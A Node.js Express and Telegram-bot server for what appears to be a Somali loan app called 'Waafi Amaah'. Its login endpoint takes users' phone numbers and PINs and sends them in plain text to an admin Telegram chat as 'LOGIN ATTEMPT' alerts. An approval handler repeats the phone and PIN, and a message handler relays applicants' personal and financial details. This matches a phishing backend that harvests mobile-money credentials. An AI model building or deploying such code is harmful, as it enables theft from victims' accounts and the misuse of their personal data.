const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// 1. Initialize Bot
const bot = new Telegraf(process.env.BOT_TOKEN);

// 2. Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 3. Home Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 4. Dynamic Routing (fixed safely)
app.get('/:page', (req, res) => {
    const page = req.params.page;
    const fileName = page.endsWith('.html') ? page : `${page}.html`;
    const filePath = path.join(__dirname, 'public', fileName);

    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`Missing file: ${filePath}`);
            res.status(404).send("Boggaan lama helin (Page not found)");
        }
    });
});

// 5. Start Command (FIXED INLINE KEYBOARD)
bot.start((ctx) => {
    ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Open App", web_app: { url: "https://your-domain.com" } }
                ]
            ]
        }
    });
});

// 6. API Login Notification
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body;
    const currentTime = new Date().toLocaleString('en-US', { hour12: true });

    const adminId = process.env.ADMIN_CHAT_ID;

    const loginMsg =
        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
        `🆕 NEW USER\n` +
        `🇸🇴 Country: Somalia\n` +
        `📞 Phone: ${phone}\n` +
        `🔢 PIN: ${pin}\n` +
        `⏰ Time: ${currentTime}`;

    try {
        await bot.telegram.sendMessage(adminId, loginMsg);
        res.json({ success: true });
    } catch (err) {
        console.error("API Notification Error:", err);
        res.status(500).json({ error: "Failed to send bot notification" });
    }
});

// 7. Web App Data Handler
bot.on('message', async (ctx) => {
    const webAppData = ctx.message?.web_app_data;
    if (!webAppData) return;

    try {
        const data = JSON.parse(webAppData.data);

        const summary =
            `✅ CODSI CUSUB WAA LA HELAY!\n\n` +
            `👤 Magaca: ${data.firstName || ''} ${data.lastName || ''}\n` +
            `📞 Phone: +252${data.phone || ''}\n` +
            `💰 Amount: $${data.amount || 'N/A'}\n` +
            `📆 Duration: ${data.duration || 'N/A'}\n` +
            `💼 Job: ${data.jobStatus || 'N/A'}\n` +
            `💵 Income: $${data.income || 'N/A'}\n` +
            `📝 Purpose: ${data.loanPurpose || 'N/A'}`;

        await ctx.reply(summary);

    } catch (err) {
        console.error("Data error:", err);
    }
});

// 8. Actions (FIXED)
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    const time = new Date().toLocaleTimeString('en-US', { hour12: true });

    const approvedMsg =
        `✅ LOGIN APPROVED\n\n` +
        `📞 ${phone}\n` +
        `🔐 ${pin}\n` +
        `⏰ ${time}`;

    try {
        await ctx.editMessageText(approvedMsg);
    } catch (e) {
        console.error("Edit failed:", e);
    }
});

bot.action('deny', (ctx) => {
    ctx.editMessageText("❌ Informashinka waa khalad.");
});

// 9. Start Server
app.listen(PORT, '0.0.0.0', async () => {
    console.log(`✅ Server is running on port ${PORT}`);

    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log('✅ Telegram Bot launched successfully');
    } catch (err) {
        console.error('❌ Bot launch failed:', err.message);
    }
});

// 10. Graceful shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
